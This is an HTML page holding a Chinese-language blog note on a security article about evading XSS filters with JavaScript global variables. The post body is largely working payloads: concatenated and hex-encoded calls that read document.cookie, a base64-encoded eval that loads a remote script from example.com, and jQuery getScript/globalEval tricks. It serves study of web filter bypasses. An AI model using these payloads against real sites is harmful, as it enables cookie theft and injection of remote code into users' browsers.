<!DOCTYPE html>
<html>
  <!-- Html Head Tag-->
  <head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="">
  <meta name="author" content="damn1t">
  <!-- Open Graph Data -->
  <meta property="og:title" content="Bypass XSS filters using JavaScript global variables（笔记）"/>
  <meta property="og:description" content="404" />
  <meta property="og:site_name" content="damn1t"/>
  <meta property="og:type" content="article" />
  <meta property="og:image" content="http://microvorld.com"/>
  
    <link rel="alternate" href="/atom.xml" title="damn1t" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  

  <!-- Site Title -->
  <title>damn1t</title>

  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="/css/bootstrap.min.css">
  <!-- Custom CSS -->
  
  <link rel="stylesheet" href="/css/style.light.css">

  <!-- Google Analytics -->
  

</head>

  <body>
    <!-- Page Header -->


<header class="site-header header-background" style="background-image: url(/img/default-banner-dark.jpg)">
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <div class="page-title with-background-image">
          <p class="title">Bypass XSS filters using JavaScript global variables（笔记）</p>
          <p class="subtitle"></p>
        </div>
        <div class="site-menu with-background-image">
          <ul>
            
              <li>
                <a href="/">
                  
                  Home
                  
                </a>
              </li>
            
              <li>
                <a href="/archives">
                  
                  Archives
                  
                </a>
              </li>
            
              <li>
                <a href="https://github.com/microvorld">
                  
                  Github
                  
                </a>
              </li>
            
              <li>
                <a href="mailto:<bubbl3@foxmail.com>">
                  
                  Email
                  
                </a>
              </li>
            
          </ul>
        </div>
      </div>
    </div>
  </div>
</header>

<article>
  <div class="container typo">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <div class="post-info text-muted">
          
            <!-- Author -->
            <span class="author info">By damn1t</span>
          
          <!-- Date -->
          <span class="date-time info">On
            <span class="date">2019-06-19</span>
            <span class="time">15:12:24</span>
          </span>
          
        </div>
        <!-- Tags -->
        
          <div class="post-tags text-muted">
            Tags: 

<a class="tag" href="/tags/xss/">#xss</a>


          </div>
        
        <!-- Post Main Content -->
        <div class="post-content">
          <h1 id="Bypass-XSS-filters-using-JavaScript-global-variables"><a href="#Bypass-XSS-filters-using-JavaScript-global-variables" class="headerlink" title="Bypass XSS filters using JavaScript global variables"></a>Bypass XSS filters using JavaScript global variables</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>很有意思的一篇文章，学到了一些姿势，以下仅作笔记</p>
<h2 id="你所需要知道的"><a href="#你所需要知道的" class="headerlink" title="你所需要知道的"></a>你所需要知道的</h2><h3 id="什么是js全局变量？"><a href="#什么是js全局变量？" class="headerlink" title="什么是js全局变量？"></a>什么是js全局变量？</h3><blockquote>
<p>A JavaScript global variable is declared outside the function or declared with window object. It can be accessed from any function. <a href="https://www.javatpoint.com/javascript-global-variable" target="_blank" rel="noopener">https://www.javatpoint.com/javascript-global-variable</a></p>
</blockquote>
<h3 id="关于-“self”-对象"><a href="#关于-“self”-对象" class="headerlink" title="关于 “self” 对象"></a>关于 “self” 对象</h3><blockquote>
<p>The Window.self read-only property returns the window itself, as a WindowProxy. It can be used with dot notation on a window object (that is, window.self) or standalone (self). The advantage of the standalone notation is that a similar notation exists for non-window contexts, such as in Web Workers. By using self, you can refer to the global scope in a way that will work not only in a window context (self will resolve to window.self) but also in a worker context (self will then resolve to WorkerGlobalScope.self). <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/self" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/API/Window/self</a></p>
</blockquote>
<p>与<code>self</code>有类似功能的对象：</p>
<ul>
<li>window</li>
</ul>
<ul>
<li>self</li>
</ul>
<ul>
<li>_self</li>
</ul>
<ul>
<li>this</li>
</ul>
<ul>
<li>top</li>
</ul>
<ul>
<li>parent</li>
</ul>
<ul>
<li>frames</li>
</ul>
<h2 id="1-级联和hex编码方式"><a href="#1-级联和hex编码方式" class="headerlink" title="1.级联和hex编码方式"></a>1.级联和hex编码方式</h2><p>有很多的WAF使用的过滤器都是基于JS的函数的黑名单模式，大多数都包含了诸如<code>alert()</code>或者<code>String.fromCharCode()</code>。幸好我们有全局变量，所以我们可以轻松的bypass，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">** alert(document.cookie);</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">self[&quot;ale&quot;+&quot;rt&quot;](self[&quot;doc&quot;+&quot;ument&quot;][&quot;coo&quot;+&quot;kie&quot;])</span><br></pre></td></tr></table></figure></p>
<p><img src="https://www.secjuice.com/content/images/2019/06/image-3.png" alt=""></p>
<p>稍复杂的绕过限制的方式是将字符串替换为以<code>\x</code>格式编码的hex序列（ascii码低于256）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; console.log(&quot;\x68\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21&quot;)</span><br><span class="line">&lt; hello, world!</span><br></pre></td></tr></table></figure></p>
<p><img src="https://www.secjuice.com/content/images/2019/06/image-2.png" alt=""></p>
<p>我们可以将其替换我们想使用的任意函数</p>
<h2 id="eval以及利用base64加密"><a href="#eval以及利用base64加密" class="headerlink" title="eval以及利用base64加密"></a>eval以及利用base64加密</h2><p>对于过滤我们输入的WAF，其中一个困难的事情就是动态创建或添加一个调用远程js文件的<code>script</code>元素。即使是一个功能不那么强大的过滤器，构建依然是困难的，因为这里有太多可识别的字符（<code>&lt;script</code>, <code>src=</code>, <code>http://</code>等等）</p>
<p>所以我们就可以利用<strong>base64</strong>和<code>eval()</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">self[&quot;\x65\x76\x61\x6c&quot;](//eval</span><br><span class="line">  self[&quot;\x61\x74\x6f\x62&quot;](//atob</span><br><span class="line">    &quot;dmFyIGhlYWQgPSBkb2N1bWVudC5nZXRFbGVtZW50\</span><br><span class="line">    c0J5VGFnTmFtZSgnaGVhZCcpLml0ZW0oMCk7dmFyI\</span><br><span class="line">    HNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbn\</span><br><span class="line">    QoJ3NjcmlwdCcpO3NjcmlwdC5zZXRBdHRyaWJ1dGU\</span><br><span class="line">    oJ3R5cGUnLCAndGV4dC9qYXZhc2NyaXB0Jyk7c2Ny\</span><br><span class="line">    aXB0LnNldEF0dHJpYnV0ZSgnc3JjJywgJ2h0dHA6L\</span><br><span class="line">    y9leGFtcGxlLmNvbS9teS5qcycpO2hlYWQuYXBwZW\</span><br><span class="line">    5kQ2hpbGQoc2NyaXB0KTs=&quot;</span><br><span class="line">  )</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
<p>base64即是编码的如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// select head tag</span><br><span class="line">var head = document.getElementsByTagName(&apos;head&apos;).item(0); </span><br><span class="line"></span><br><span class="line">// create an empty &lt;script&gt; element</span><br><span class="line">var script = document.createElement(&apos;script&apos;);</span><br><span class="line"></span><br><span class="line">// set the script element type attribute</span><br><span class="line">script.setAttribute(&apos;type&apos;, &apos;text/javascript&apos;);</span><br><span class="line"></span><br><span class="line">// set the script element src attribute</span><br><span class="line">script.setAttribute(&apos;src&apos;,&apos;http://example.com/my.js&apos;);</span><br><span class="line"></span><br><span class="line">// append it to the head element</span><br><span class="line">head.appendChild(script);</span><br></pre></td></tr></table></figure></p>
<p><img src="https://www.secjuice.com/content/images/2019/06/image-13.png" alt=""></p>
<h2 id="3-jQuery"><a href="#3-jQuery" class="headerlink" title="3.jQuery"></a>3.jQuery</h2><p>现在的网站大量利用了诸如jQuery的第三方库。当<code>self[&quot;eval&quot;]</code>和hex编码无法使用，于是我们可以利用如<code>self[&quot;$&quot;][&quot;globalEval&quot;]</code></p>
<table><br>  <tr><th>PAYLOAD</th><th>ACTION</th><br>  </tr><tr><td><code>self[&quot;$&quot;][&quot;globalEval&quot;](&quot;alert(1)&quot;);</code></td><td>pass</td></tr><br>  <tr><td><code>self[&quot;\x24&quot;]
[&quot;\x67\x6c\x6f\x62\x61\x6c\x45\x76\x61\x6c&quot;]
(&quot;\x61\x6c\x65\x72\x74\x28\x31\x29&quot;);</code></td><td>pass</td></tr><br></table> 


<p>你可以轻易添加一个本地或远程脚本利用<code>self[&quot;$&quot;][&quot;getScript&quot;](url)</code>来进行加载，<code>. getScript</code>以<code>get</code>请求的方式从服务器加载一个js文件。该脚本在全局上下文中执行，因此它可以引用其他变量并使用jQuery函数。</p>
<table>
<thead>
<tr>
<th style="text-align:left">PAYLOAD</th>
<th style="text-align:left">ACTION</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>self[&quot;$&quot;][&quot;getScript&quot;](&quot;https://example.com/my.js&quot;);</code></td>
<td style="text-align:left">pass</td>
</tr>
</tbody>
</table>
<p><img src="https://www.secjuice.com/content/images/2019/06/image-12.png" alt=""></p>
<h2 id="4-Iteration-and-Object-keys"><a href="#4-Iteration-and-Object-keys" class="headerlink" title="4.Iteration and Object.keys"></a>4.Iteration and Object.keys</h2><p><code>Object.keys()</code>以数组形式返回所给的对象所拥有的属性（property）名称，与正常循环相同的顺序。<br><img src="https://www.secjuice.com/content/images/2019/06/image.png" alt=""></p>
<p>这意味着我们可以通过使用索引号而不是函数名来访问任何JavaScript函数。例如，打开浏览器的Web控制台并键入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=0; for(i in self) &#123; if(i == &quot;alert&quot;) &#123; console.log(c); &#125; c++; &#125;</span><br></pre></td></tr></table></figure></p>
<p>这为您提供了self对象中“alert”函数的索引号。每个浏览器和每个打开的文档（在我的示例中为5）的数字不同，但它可以使您无需使用其名称即可调用任何函数。例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; Object.keys(self)[5]</span><br><span class="line">&lt; &quot;alert&quot;</span><br><span class="line">&gt; self[Object.keys(self)[5]](&quot;foo&quot;) // alert(&quot;foo&quot;)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://www.secjuice.com/content/images/2019/06/image-1.png" alt=""></p>
<p>为了迭代<code>self</code>中的所有函数，你可以遍历<code>self</code>对象并检查元素是否是使用<code>typeof elm ===“function”</code>的函数:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f=&quot;&quot;</span><br><span class="line">for(i in self) &#123;</span><br><span class="line">    if(typeof self[i] === &quot;function&quot;) &#123;</span><br><span class="line">        f += i+&quot;, &quot;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;;</span><br><span class="line">console.log(f)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://www.secjuice.com/content/images/2019/06/image-14.png" alt=""></p>
<p>如前所述，这个数字可以在不同的浏览器和文档上更改，因此，如果不允许“alert”字符串并且不能使用上述任何方法，我们如何找到“alert”索引号？JavaScript为您提供了很多机会。我们可以做的一件事是为变量分配（a），一个迭代<code>self</code>并找到<code>alert</code>索引号的函数。然后，我们可以使用<code>test（）</code>来查找带有正则表达式的“alert”，如<code>^ a [rel] + t $</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">a = function() &#123;</span><br><span class="line">    c=0; // index counter</span><br><span class="line">    for(i in self) &#123;</span><br><span class="line">        if(/^a[rel]+t$/.test(i)) &#123;</span><br><span class="line">            return c;</span><br><span class="line">        &#125;</span><br><span class="line">        c++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// in one line</span><br><span class="line">a=()=&gt;&#123;c=0;for(i in self)&#123;if(/^a[rel]+t$/.test(i))&#123;return c&#125;c++&#125;&#125;</span><br><span class="line"></span><br><span class="line">// then you can use a() with Object.keys</span><br><span class="line">// alert(&quot;foo&quot;)</span><br><span class="line"></span><br><span class="line">self[Object.keys(self)[a()]](&quot;foo&quot;)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://www.secjuice.com/content/images/2019/06/image-7.png" alt=""></p>
<p>注：</p>
<blockquote>
<p>test() 方法用于检测一个字符串是否匹配某个模式.<br>语法：<br>RegExpObject.test(string)</p>
<p>返回值：<br>如果字符串 string 中含有与 RegExpObject 匹配的文本，则返回 true，否则返回 false。</p>
<p>说明：<br>调用 RegExp 对象 r 的 test() 方法，并为它传递字符串 s，与这个表示式是等价的：(r.exec(s) != null)。</p>
</blockquote>
<p>原文地址：<br><a href="https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/" target="_blank" rel="noopener">https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/</a></p>

        </div>
      </div>
    </div>
  </div>
</article>



    <!-- Footer -->
<footer>
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <p class="copyright text-muted">
          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
        <p class="copyright text-muted">
          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
        </p>
      </div>
    </div>
  </div>
</footer>


    <!-- After Footer Scripts -->
<script src="/js/highlight.pack.js"></script>
<script>
  document.addEventListener("DOMContentLoaded", function(event) {
    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
    codeBlocks.forEach(function(block, index) {
      hljs.highlightBlock(block);
    });
  });
</script>

  </body>
</html>

